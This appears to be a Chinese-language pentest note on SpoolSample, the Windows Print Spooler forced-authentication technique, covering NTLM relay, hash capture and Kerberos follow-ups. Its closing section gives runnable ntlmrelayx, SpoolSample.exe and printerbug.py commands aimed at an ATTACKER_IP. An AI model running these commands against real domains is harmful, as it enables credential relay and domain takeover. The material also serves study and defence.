# SpoolSample

## 介绍

SpoolSample是一个利用Windows打印后台服务（Print Spooler）进行身份强制认证（NTLM/Kerberos）的攻击PoC

SpoolSample = 逼域控（或服务器）“主动”向你发起认证，从而窃取或中继它的凭据。

## 原理

SpoolSample利用的是：

​	（1）MS-RPRN（打印机远程管理RPC接口）

​	（2）调用RpcRemoteFindFirstPrinterChangeNotificationEx

​	（3）指定一个恶意的UNC路径（如\\\\ATTACKER\\share)

结果是：

​	（1）目标主机（通常是DC）会主动去访问你的UNC路径

​	（2）访问时会发送NTLM/Kerberos认证

## 它能干什么？

SpoolSample本身不直接提权，它是一个触发器，常见用途有三种：

### 配合NTLM Relay

```
DC --NTLM-- ->你 --relay--> LDAP / SMB / HTTP
```

如果满足条件

​	（1）SMB签名（signing disabled）（或中继LDAP/HTTP）

​	（2）目标是DC或者高权限服务器

你可以做到：

​	（1）LDAP Relay -> DCSync

​	（2）LDAP Relay -> 给自己加权限

​	（3）Relay 到ADCS ->证书攻击

### 抓Net-NTLM HAsh

如果不能relay：

​	（1）你至少能拿到Net-NTLMv2

​	（2）用hashcat离线破解

对DC来说意义不大

但对普通服务器/管理账号管用

### Kerberos强制认证

在Kerberos环境中：

​	1）目标可能向你请求TGS

​	2）可配合

​		（1）RBCD

​		（2）S4U

​		（3）Shadow Credentials

​		（4）ADCS

现代攻击链里，SpoolSample 往往只是第一步

## 为什么它以前那么猛？

（1）域控默认开启Print Spooler

（2）SMB签名在客户端/LDAP上没强制

（3）没人监控RPC打印接口

结果就是 

一个普通域用户->触发SpoolSample->realy->DCSync

## 现在还能用吗？

| 情况                  | 结果           |
| --------------------- | -------------- |
| DC 关闭 Print Spooler | 直接失败       |
| SMB 强制签名          | SMB relay不行  |
| LDAP signing          | LDAP relay不行 |
| 有ADCS+HTTP           | 还能打         |
| 老环境                | ok             |

## SpoolSample 的典型使用方式（概念层）

```
1. 你监听（Responder / ntlmrelayx）
2. 你运行 SpoolSample 指向你的 IP
3. 目标主动来认证
4. 你 relay / 抓 hash / 拿票据
```

## 利用

### 1）启动中继

```
impacket-ntlmrelayx -t ldap://DC_IP -smb2support --add-computer
```

### 2）触发Printer Bug

```
SpoolSample.exe <TARGET_IP> <ATTACKER_IP> # C#版本
python3 printerbug.py domain/user:pass@TARGET_IP ATTACKER_IP # Python版
```

### 3）结果

目标账户认证被中继，自动添加新计算机账户或者RBCD，实现提权/DCSync